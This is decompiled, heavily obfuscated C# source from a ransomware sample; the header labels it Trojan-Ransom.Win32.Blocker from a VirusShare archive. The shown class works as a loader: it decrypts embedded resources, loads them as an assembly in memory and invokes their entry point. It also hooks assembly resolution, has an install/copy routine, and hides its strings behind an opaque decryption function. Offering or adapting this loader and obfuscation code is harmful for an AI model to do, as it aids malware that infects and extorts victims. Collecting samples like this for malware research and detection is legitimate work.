// Decompiled with JetBrains decompiler
// Type: ?1?.?33?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B16D8A9B-E0EE-4C85-A3BA-4405997EF24D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.bgfw-a4892676fe7d1d73d3b37d39e1a1e9d1be41dca8bcf297ce0ddfed35c970d2b7.exe

using \u003F1\u003F;
using \u003F15\u003F;
using System;
using System.Collections.Specialized;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;

namespace \u003F1\u003F
{
  internal class \u003F33\u003F
  {
    private static readonly string \u003F1\u003F = \u003F23\u003F.\u003F1\u003F(1082945938, 150494731, 2132766607);
    private static readonly string \u003F15\u003F = \u003F23\u003F.\u003F1\u003F(1264393871, 150494725, 2132766601);
    private static readonly string \u003F16\u003F = \u003F23\u003F.\u003F1\u003F(1527590837, 150494739, 2132766605);
    private static HybridDictionary \u003F1\u003F = (HybridDictionary) null;
    private static ResourceManager \u003F1\u003F = (ResourceManager) null;
    private static \u003F5\u003F \u003F1\u003F = new \u003F5\u003F();
    private static bool \u003F1\u003F = false;

    [SpecialName]
    private static bool \u0020() => bool.Parse(\u003F23\u003F.\u003F1\u003F(512814017, 150494357, 2132766605));

    private static bool \u003F1\u003F(string[] _param0)
    {
      if (\u003F23\u003F.\u003F1\u003F(2031742654, 150494429, 2132766605).ToLower() == \u003F23\u003F.\u003F1\u003F(423543207, 150494421, 2132766607) && _param0 != null && _param0.Length > 0)
        goto label_5;
label_4:
      return true;
label_5:
      string str1 = \u003F23\u003F.\u003F1\u003F(254015052, 150494421, 2132766599);
      string str2 = \u003F23\u003F.\u003F1\u003F(803387532, 150494421, 2132766599);
      bool flag = bool.Parse(\u003F23\u003F.\u003F1\u003F(1217476982, 150494371, 2132766605));
      string str3 = \u003F23\u003F.\u003F1\u003F(1470423446, 150494371, 2132766599);
      \u003F38\u003F.\u003F46\u003F obj = bool.Parse(\u003F23\u003F.\u003F1\u003F(676631184, 150494395, 2132766607)) ? \u003F38\u003F.\u003F46\u003F.\u003F1\u003F : \u003F38\u003F.\u003F46\u003F.\u003F15\u003F;
      if (_param0[0] == \u003F23\u003F.\u003F1\u003F(1862214651, 150494347, 2132766615))
        goto label_6;
label_2:
      if (_param0[0] == \u003F23\u003F.\u003F1\u003F(689513540, 150494367, 2132766611))
      {
        if (\u003F38\u003F.\u003F1\u003F(str1, true))
          return \u003F33\u003F.\u0020();
        Environment.Exit(5);
        goto label_4;
      }
      else
        goto label_4;
label_6:
      if (\u003F38\u003F.\u003F1\u003F(Assembly.GetEntryAssembly().Location, str1, str2, flag, true, str3, obj))
        return \u003F33\u003F.\u0020();
      Environment.Exit(5);
      goto label_2;
    }

    [STAThread]
    private static void \u003F15\u003F(string[] _param0)
    {
      if (!\u003F33\u003F.\u003F1\u003F(_param0) || new \u003F2\u003F().\u003F1\u003F(DateTime.Now.Millisecond) != \u003F23\u003F.\u003F1\u003F(1493001111, 150494407, 2132766595))
        return;
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u003F33\u003F.\u003F1\u003F);
      \u003F33\u003F.\u003F16\u003F(_param0);
    }

    private static void \u003F16\u003F(string[] _param0) => \u003F33\u003F.\u003F1\u003F((Assembly) \u003F33\u003F.\u003F1\u003F(\u003F33\u003F.\u003F1\u003F(\u003F23\u003F.\u003F1\u003F(1042676661, 150494211, 2132766663)) ?? throw new Exception(\u003F23\u003F.\u003F1\u003F(1921959417, 150494403, 2132766663))), _param0);

    private static object \u003F1\u003F(byte[] _param0)
    {
      try
      {
        return new \u003F2\u003F().\u003F1\u003F(DateTime.Now.Millisecond) != \u003F23\u003F.\u003F1\u003F(1099250160, 150494275, 2132766595) ? (object) null : (object) Assembly.Load(_param0);
      }
      catch (Exception ex)
      {
        return (object) null;
      }
    }

    private static Assembly \u003F15\u003F()
    {
      try
      {
        byte[] buffer = \u003F33\u003F.\u003F1\u003F(\u003F23\u003F.\u003F1\u003F(1557548716, 150494287, 2132766621));
        return buffer == null ? (Assembly) null : Assembly.Load(new MemoryStream(buffer).ToArray());
      }
      catch
      {
        return (Assembly) null;
      }
    }

    private static void \u003F1\u003F(Assembly _param0, string[] _param1)
    {
      MethodInfo entryPoint = _param0.EntryPoint;
      ParameterInfo[] parameters1 = entryPoint.GetParameters();
      object[] parameters2 = (object[]) null;
      if (parameters1 != null && parameters1.Length > 0)
        goto label_2;
label_1:
      entryPoint.Invoke((object) null, parameters2);
      return;
label_2:
      parameters2 = new object[1]{ (object) _param1 };
      goto label_1;
    }

    [Obfuscation(Exclude = true, Feature = "cw method body protection", StripAfterObfuscation = false)]
    private static Assembly \u003F1\u003F(object _param0, ResolveEventArgs _param1) => \u003F33\u003F.\u003F1\u003F(_param1);

    private static Assembly \u003F1\u003F(ResolveEventArgs _param0) => !\u003F33\u003F.\u003F1\u003F ? (Assembly) \u003F33\u003F.\u003F17\u003F(_param0.Name) : (Assembly) null;

    [SpecialName]
    public static string \u0002() => Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);

    private static byte[] \u003F1\u003F(string _param0)
    {
      if (\u003F33\u003F.\u003F1\u003F == null)
        \u003F33\u003F.\u003F1\u003F = new ResourceManager(\u003F23\u003F.\u003F1\u003F(1726682699, 150494541, 2132766663), typeof (\u003F33\u003F).Assembly);
      try
      {
        \u003F33\u003F.\u003F1\u003F = true;
        string str = \u003F33\u003F.\u003F15\u003F(_param0);
        return \u003F2\u003F.\u003F15\u003F((byte[]) \u003F33\u003F.\u003F1\u003F.GetObject(\u003F2\u003F.\u003F15\u003F(str)), \u003F23\u003F.\u003F1\u003F(1053472398, 150494707, 2132766709), \u003F23\u003F.\u003F1\u003F(1190349105, 150494305, 2132766709));
      }
      finally
      {
        \u003F33\u003F.\u003F1\u003F = false;
      }
    }

    private static string \u003F15\u003F(string _param0) => _param0.Replace(\u003F23\u003F.\u003F1\u003F(2038378021, 150494961, 2132766597), \u003F23\u003F.\u003F1\u003F(115308969, 150494965, 2132766595)).Replace(\u003F23\u003F.\u003F1\u003F(929688571, 150494923, 2132766597), \u003F23\u003F.\u003F1\u003F(631826503, 150494927, 2132766595)).Replace(\u003F23\u003F.\u003F1\u003F(565463895, 150494931, 2132766611), \u003F23\u003F.\u003F1\u003F(442040687, 150494935, 2132766595)).Replace(\u003F23\u003F.\u003F1\u003F(1948229313, 150494907, 2132766611), \u003F23\u003F.\u003F1\u003F(482727819, 150494911, 2132766595)).Replace(\u003F23\u003F.\u003F1\u003F(1979856375, 150494857, 2132766601), \u003F23\u003F.\u003F1\u003F(880524445, 150494861, 2132766595));

    private static byte[] \u003F1\u003F(StringDictionary _param0)
    {
      string path2_1 = _param0[\u003F33\u003F.\u003F15\u003F];
      string path2_2 = _param0[\u003F33\u003F.\u003F1\u003F];
      bool flag = path2_1.ToLower().Equals(\u003F23\u003F.\u003F1\u003F(1307903743, 150494963, 2132766601));
      AppDomain currentDomain = AppDomain.CurrentDomain;
      StringCollection stringCollection1 = new StringCollection();
      string path1 = currentDomain.SetupInformation.ApplicationBase;
      if (!flag)
        goto label_9;
label_1:
      stringCollection1.Add(path1);
      stringCollection1.Add(Path.Combine(path1, path2_2));
      byte[] numArray = \u003F33\u003F.\u003F1\u003F(stringCollection1, path2_2);
      if (numArray != null)
        return numArray;
      StringCollection stringCollection2 = new StringCollection();
      string privateBinPath = currentDomain.SetupInformation.PrivateBinPath;
      switch (privateBinPath)
      {
        case null:
          return (byte[]) null;
        default:
          if (privateBinPath.Trim().Length > 0)
          {
            string str1 = privateBinPath;
            char[] chArray1 = new char[1]
            {
              Path.PathSeparator
            };
            foreach (string str2 in str1.Split(chArray1))
            {
              char[] chArray2 = new char[3]
              {
                ' ',
                '\t',
                Path.PathSeparator
              };
              string str3 = str2.Trim(chArray2);
              if (!Path.IsPathRooted(str3))
                goto label_12;
label_6:
              if (!flag)
                goto label_13;
label_7:
              stringCollection2.Add(str3);
              stringCollection2.Add(Path.Combine(str3, path2_2));
              continue;
label_13:
              str3 = Path.Combine(str3, path2_1);
              goto label_7;
label_12:
              str3 = Path.Combine(currentDomain.SetupInformation.ApplicationBase, str3);
              goto label_6;
            }
            return \u003F33\u003F.\u003F1\u003F(stringCollection2, path2_2);
          }
          goto case null;
      }
label_9:
      path1 = Path.Combine(path1, path2_1);
      goto label_1;
    }

    private static byte[] \u003F1\u003F(StringCollection _param0, string _param1)
    {
      for (int index = 0; index < _param0.Count; ++index)
      {
        string path = Path.Combine(_param0[index], _param1 + \u003F33\u003F.\u003F16\u003F);
        if (File.Exists(path))
          return \u003F33\u003F.\u003F16\u003F(path);
      }
      return (byte[]) null;
    }

    private static byte[] \u003F16\u003F(string _param0)
    {
      FileStream fileStream = (FileStream) null;
      byte[] buffer = (byte[]) null;
      try
      {
        fileStream = File.OpenRead(_param0);
        buffer = new byte[fileStream.Length];
        fileStream.Read(buffer, 0, buffer.Length);
        fileStream.Flush();
      }
      finally
      {
        fileStream?.Close();
      }
      return buffer;
    }

    private static object \u003F17\u003F(string _param0)
    {
      switch (_param0)
      {
        case null:
          return (object) null;
        default:
          if (\u003F33\u003F.\u003F1\u003F == null)
            \u003F33\u003F.\u003F1\u003F = new HybridDictionary();
          _param0 = _param0.Trim();
          string lower = _param0.ToLower();
          if (\u003F33\u003F.\u003F1\u003F[(object) lower] != null)
            return (object) (Assembly) \u003F33\u003F.\u003F1\u003F[(object) lower];
          StringDictionary stringDictionary = \u003F33\u003F.\u003F18\u003F(_param0);
          string str = stringDictionary[\u003F33\u003F.\u003F1\u003F];
          byte[] numArray1 = (byte[]) null;
          if (str.ToLower().Equals(\u003F23\u003F.\u003F1\u003F(1090758409, 150494945, 2132766613)))
          {
            Assembly assembly = \u003F33\u003F.\u003F15\u003F();
            \u003F33\u003F.\u003F1\u003F[(object) lower] = (object) assembly;
            return (object) assembly;
          }
          byte[] numArray2 = \u003F33\u003F.\u003F1\u003F(_param0) ?? \u003F33\u003F.\u003F1\u003F(str);
          if (numArray2 == null)
          {
            try
            {
              numArray2 = \u003F33\u003F.\u003F1\u003F(stringDictionary);
            }
            catch
            {
              numArray2 = (byte[]) null;
            }
          }
          if (numArray2 == null)
            return (object) null;
          object obj = \u003F33\u003F.\u003F1\u003F(numArray2);
          numArray1 = (byte[]) null;
          \u003F33\u003F.\u003F1\u003F[(object) lower] = obj;
          return obj;
      }
    }

    private static StringDictionary \u003F18\u003F(string _param0)
    {
      StringDictionary stringDictionary = new StringDictionary();
      string str1 = _param0;
      char[] chArray1 = new char[1]{ ',' };
      foreach (string str2 in str1.Split(chArray1))
      {
        char[] chArray2 = new char[2]{ ' ', ',' };
        string[] strArray = str2.Trim(chArray2).Split('=');
        if (strArray.Length >= 2)
        {
          stringDictionary.Add(strArray[0].Trim(' ', '='), strArray[1].Trim(' ', '='));
          continue;
        }
        stringDictionary.Add(\u003F33\u003F.\u003F1\u003F, strArray[0]);
      }
      return stringDictionary;
    }
  }
}
